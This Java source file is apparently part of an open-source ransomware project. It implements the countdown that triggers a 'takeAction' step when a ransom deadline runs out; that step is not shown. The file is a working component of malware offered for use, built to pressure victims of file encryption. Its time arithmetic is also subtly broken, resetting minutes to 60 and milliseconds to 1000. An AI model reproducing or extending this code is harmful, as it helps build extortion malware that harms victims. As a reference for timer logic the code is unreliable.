package com.bechris100.open_ransomware.action.timeout;

import com.bechris100.open_ransomware.RansomwareClass;

import java.util.Timer;
import java.util.TimerTask;

public class Timeout {

    public static void startCountdown(TimeoutInterface tInterface) {
        new Timer().scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                if (RansomwareClass.timeoutMilliseconds == 0 &&
                        RansomwareClass.timeoutSeconds == 0 &&
                        RansomwareClass.timeoutMinutes == 0 &&
                        RansomwareClass.timeoutHours == 0 &&
                        RansomwareClass.timeoutDays == 0) {
                    TimeoutAction.takeAction();
                    this.cancel();
                } else {
                    if (RansomwareClass.timeoutDays >= 1 && RansomwareClass.timeoutHours == 0) {
                        RansomwareClass.timeoutHours = 23;
                        RansomwareClass.timeoutDays--;
                    } else if (RansomwareClass.timeoutHours >= 1 && RansomwareClass.timeoutMinutes == 0) {
                        RansomwareClass.timeoutMinutes = 60;
                        RansomwareClass.timeoutHours--;
                    } else if (RansomwareClass.timeoutMinutes >= 1 && RansomwareClass.timeoutSeconds == 0) {
                        RansomwareClass.timeoutSeconds = 59;
                        RansomwareClass.timeoutMinutes--;
                    } else if (RansomwareClass.timeoutSeconds >= 1 && RansomwareClass.timeoutMilliseconds == 0) {
                        RansomwareClass.timeoutMilliseconds = 1000;
                        RansomwareClass.timeoutSeconds--;
                    } else
                        RansomwareClass.timeoutMilliseconds--;
                }

                if (tInterface != null)
                    tInterface.timeout(RansomwareClass.timeoutMilliseconds,
                            RansomwareClass.timeoutSeconds,
                            RansomwareClass.timeoutMinutes,
                            RansomwareClass.timeoutHours,
                            RansomwareClass.timeoutDays);
            }
        }, 1, 1);
    }

    public interface TimeoutInterface {
        void timeout(int milliseconds, int seconds, int minutes, int hours, int days);
    }

}
